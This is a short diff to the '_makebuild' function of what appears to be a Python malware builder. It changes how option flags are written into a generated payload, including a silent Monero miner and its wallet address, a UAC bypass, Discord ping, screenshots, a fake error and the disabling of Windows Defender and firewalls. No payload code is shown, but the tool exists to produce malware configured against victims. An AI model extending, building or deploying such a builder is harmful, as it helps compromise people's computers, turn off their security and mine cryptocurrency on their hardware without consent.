@@ -259,8 +259,8 @@ def _makebuild(q: Queue, data_builder) -> str:
                 .replace("screenshot = False", f"screenshot = {data_builder['screenshot']}") \
                 .replace("discord_ping = False", f"discord_ping = {data_builder['ping']}") \
                 .replace("uac_bypass = False", f"uac_bypass = {data_builder['uac_bypass']}") \
-                .replace("silent_crypto__miner = False", f"silent_crypto__miner = {data_builder['silent_crypto_miner']}") \
-                .replace("_WALLET_ADR_HERE", f"{data_builder['wallet_adress']}") \
+                .replace("xmr_miner = False", f"xmr_miner = {data_builder['silent_crypto_miner']}") \
+                .replace("wallet_adressss", f"{data_builder['wallet_adress']}") \
                 .replace("disable_defender = False", f"disable_defender = {data_builder['disable_defender']}") \
                 .replace("disable_firewalls = False", f"disable_firewalls = {data_builder['disable_firewalls']}") \
                 .replace("fake_error = False", f"fake_error = {data_builder['fake_error']}") \
